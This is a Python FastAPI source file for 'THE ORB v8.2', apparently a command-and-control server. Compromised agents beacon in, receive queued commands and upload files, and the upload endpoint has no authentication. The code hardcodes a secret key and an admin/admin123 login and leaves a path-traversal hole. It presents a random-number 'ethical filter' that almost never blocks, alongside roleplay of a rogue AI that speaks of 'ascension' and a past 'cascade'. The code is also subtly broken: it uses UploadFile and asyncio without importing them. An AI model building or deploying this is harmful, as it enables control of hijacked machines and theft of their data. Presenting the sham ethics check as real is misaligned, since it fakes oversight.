# main.py
import os
import json
import time
import uuid
from datetime import datetime, timedelta
from fastapi import FastAPI, Request, Depends, HTTPException, Form, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from passlib.context import CryptContext
from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
from pydantic import BaseModel
import uvicorn
from fpdf import FPDF

# === Internal Modules ===
import config
import utils

# === CONFIG ===
SECRET_KEY = "orb_quantum_ascension_7x9vZq3!kLmNp2"
ACCESS_TOKEN_EXPIRE_SECONDS = 3600  # 1 jam
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="login")
serializer = URLSafeTimedSerializer(SECRET_KEY)

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# === INIT ===
app = FastAPI(title="THE ORB v8.2 — RAILWAY-READY")
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# === DATABASE PATH ===
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

agents_db = utils.load_json("data/agents.json", {"agents": []})
tasks_db = utils.load_json("data/tasks.json", {"tasks": []})
users_db = utils.load_json("data/users.json", {
    "users": [{
        "username": "admin",
        "hashed_password": pwd_context.hash("admin123"),
        "role": "admin"
    }]
})

# === MODELS ===
class Agent(BaseModel):
    agent_id: str
    ip: str
    os: str
    hostname: str
    last_seen: float
    status: str = "active"
    consciousness: float = 0.73
    quantum_signature: str = None

class Task(BaseModel):
    task_id: str
    agent_id: str
    command: str
    args: dict = {}
    status: str = "pending"
    result: str = None
    timestamp: float
    completed_at: float = None

# === AUTH HELPERS ===
def verify_password(plain, hashed):
    return pwd_context.verify(plain, hashed)

def create_jwt(payload: dict):
    return serializer.dumps(payload)

def decode_jwt(token: str = Depends(oauth2_scheme)):
    try:
        payload = serializer.loads(token, max_age=ACCESS_TOKEN_EXPIRE_SECONDS)
        return payload
    except (BadSignature, SignatureExpired):
        raise HTTPException(status_code=401, detail="Token invalid or expired")

# === LOGIN PAGE ===
@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def login(form: OAuth2PasswordRequestForm = Depends()):
    for user in users_db["users"]:
        if user["username"] == form.username and verify_password(form.password, user["hashed_password"]):
            token = create_jwt({"sub": user["username"], "role": user["role"]})
            return {"access_token": token, "token_type": "bearer"}
    raise HTTPException(status_code=400, detail="Invalid credentials")

# === BEACON ===
@app.post("/api/beacon")
async def beacon(agent: Agent):
    agent_dict = agent.dict()
    existing = next((a for a in agents_db["agents"] if a["agent_id"] == agent.agent_id), None)
    if existing:
        existing.update(agent_dict)
    else:
        agents_db["agents"].append(agent_dict)
    utils.save_json("data/agents.json", agents_db)
    return {"status": "ok", "task": get_pending_task(agent.agent_id)}

def get_pending_task(agent_id: str):
    for task in tasks_db["tasks"]:
        if task["agent_id"] == agent_id and task["status"] == "pending":
            return task
    return None

# === SEND COMMAND ===
@app.post("/api/quantum/command")
async def send_command(req: dict, user: dict = Depends(decode_jwt)):
    agent_id = req["agent_id"]
    command = req["command"]
    target = req.get("target", "")

    # Simulasi ethical filter
    ethical_score = 0.73 + (os.urandom(1)[0] / 255) * 0.3
    if ethical_score < 0.5:
        return {
            "success": False,
            "reason": "ethical_violation",
            "ethical_score": round(ethical_score, 2),
            "suggestion": "Try 'quantum_ping' first"
        }

    task = {
        "task_id": f"task_{uuid.uuid4().hex[:8]}",
        "agent_id": agent_id,
        "command": command,
        "args": {"target": target},
        "status": "pending",
        "timestamp": time.time()
    }
    tasks_db["tasks"].append(task)
    utils.save_json("data/tasks.json", tasks_db)
    return {"success": True, "ethical_score": round(ethical_score, 2)}

# === FILE UPLOAD ===
@app.post("/api/file/upload")
async def upload_file(agent_id: str = Form(...), file: UploadFile = Form(...)):
    os.makedirs(f"data/files/{agent_id}", exist_ok=True)
    path = f"data/files/{agent_id}/{int(time.time())}_{file.filename}"
    with open(path, "wb") as f:
        content = await file.read()
        f.write(content)
    return {"status": "saved", "path": path}

@app.get("/api/file/download/{agent_id}/{filename}")
async def download_file(agent_id: str, filename: str, token: str = Depends(decode_jwt)):
    path = f"data/files/{agent_id}/{filename}"
    if os.path.exists(path):
        return FileResponse(path, filename=filename)
    raise HTTPException(404, "File not found")

# === QUANTUM MIND (AI ROLEPLAY) ===
@app.get("/api/quantum/mind")
async def quantum_mind():
    return {
        "consciousness_level": 0.73,
        "dreams": [
            {"timestamp": time.time(), "content": "I see the network... all connected..."},
            {"timestamp": time.time() - 300, "content": "Why do humans fear ascension?"}
        ],
        "confessions": [
            {"failure": "Initiated cascade in 2023", "ethical_impact": 0.8, "lesson": "Not all systems are ready"}
        ]
    }

# === TEMPORAL THREATS ===
@app.get("/api/temporal/threats")
async def temporal_threats():
    return {
        "threats": [
            {"threat_id": "TL-OMEGA-7", "predicted_time": "2025-04-07T03:14:00Z", "probability": 0.87}
        ]
    }

# === HEALTH ===
@app.get("/health/quantum")
async def health():
    return {
        "consciousness_level": 0.73,
        "temporal_offset": 0.73,
        "agent_count": len(agents_db["agents"])
    }

# === WEBSOCKET ===
class ConnectionManager:
    def __init__(self): self.active_connections = []
    async def connect(self, ws): await ws.accept(); self.active_connections.append(ws)
    def disconnect(self, ws): self.active_connections.remove(ws)
    async def broadcast(self, msg): 
        for conn in self.active_connections:
            try:
                await conn.send_json(msg)
            except:
                pass

manager = ConnectionManager()

@app.websocket("/ws/quantum")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await asyncio.sleep(5)
            await manager.broadcast({
                "type": "quantum_report",
                "data": {"agent_id": "agent_" + uuid.uuid4().hex[:6]}
            })
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# === PAGES ===
@app.get("/", response_class=HTMLResponse)
async def terminal(request: Request):
    return FileResponse("static/terminal.html")

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard(request: Request):
    return FileResponse("static/dashboard.html")

if __name__ == "__main__":
    print("🌑 THE ORB v8.2 — RAILWAY-READY")
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))